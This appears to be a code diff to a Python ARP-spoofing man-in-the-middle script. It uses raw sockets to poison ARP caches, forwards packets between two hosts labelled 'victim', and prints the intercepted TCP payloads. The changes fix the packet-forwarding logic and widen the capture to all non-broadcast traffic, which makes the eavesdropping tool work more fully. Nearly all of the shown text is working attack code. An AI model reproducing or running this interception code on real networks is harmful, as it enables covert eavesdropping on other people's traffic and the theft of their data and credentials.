@@ -26,11 +26,13 @@ mac2 = get_mac(ip2_unpacked)
 
 # Sets up socket to send ARP reply
 s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-print(os.system('ifconfig'))
+ifconfig_info = subprocess.check_output(['ifconfig']).decode("utf-8")
+print(ifconfig_info)
 net_device = input("Select network device: ")
 s.bind((net_device, socket.SOCK_RAW))
 
 # This computers mac address
+my_ip = re.search(net_device + ":.+[\n\t\r ]+inet (([0-9]+\.){3}[0-9]+)", ifconfig_info).group(1)
 my_mac = s.getsockname()[4]
 
 # Creates an arp packet
@@ -84,7 +86,6 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
         packet = packet[0]
         ethernet_length = 14
         eth_header = packet[:ethernet_length] #Ethernet header is 14 bytes
-        srcMACpacked = eth_header[6:12]
         unpacked_eth = unpack('>6s6sH', eth_header)
         #  unpacked_eth:
         #-----------------
@@ -92,6 +93,7 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
         #   0 -  Destination MAC Address (48 bits)
         #   1 - Source MAC Address (48 bits)
         #   2 - EtherType (16 bits)
+        srcMAC = unpacked_eth[1]
         etherType = unpacked_eth[2]
         if etherType == 0x0806:
             arp_header = packet[ethernet_length:ethernet_length+28]
@@ -126,10 +128,13 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
 
             #Forward packet to victim
             new_dst_MAC = None
-            if srcMACpacked == Host_One_MAC and dstIP != myIP:
-                new_dst_MAC = Host_One_MAC
-            elif srcMACpacked == Host_Two_MAC and dstIP != myIP:
+            #print(str(srcMAC) + "\n" + str(unpack('>6s', Host_One_MAC)[0]))
+            #print(str(unpack('>6s', Host_Two_MAC)[0])+"\n"+dstIP+"\n"+my_ip)
+
+            if srcMAC == unpack('>6s', Host_One_MAC)[0] and dstIP != my_ip:
                 new_dst_MAC = Host_Two_MAC
+            elif srcMAC == unpack('>6s', Host_Two_MAC)[0] and dstIP != my_ip:
+                new_dst_MAC = Host_One_MAC
             #Reconstruct packet with actual MAC
             if new_dst_MAC != None:
                 new_packet = [new_dst_MAC,packet[6:]]
@@ -158,7 +163,7 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
             header_size = ethAndIP_len + tcp_header_length
 
             data = packet[header_size:]
-            if len(data) > 0 and ((srcIP == Host_One_IP and dstIP == Host_Two_IP) or (dstIP == Host_One_IP and srcIP == Host_Two_IP)):
+            if len(data) > 0 and (dstIP != my_ip and dstIP != "255.255.255.255" and dstIP != "0.0.0.0"):
                 data_string = str(data)
                 print('SrcIP: ' + str(srcIP) + ' SrcPort: ' + str(srcPort) + ' DestIP: ' + str(dstIP) + ' DestPort: ' + str(dstPort) + '\nData: ' + data_string[2:len(data_string)-1])
 
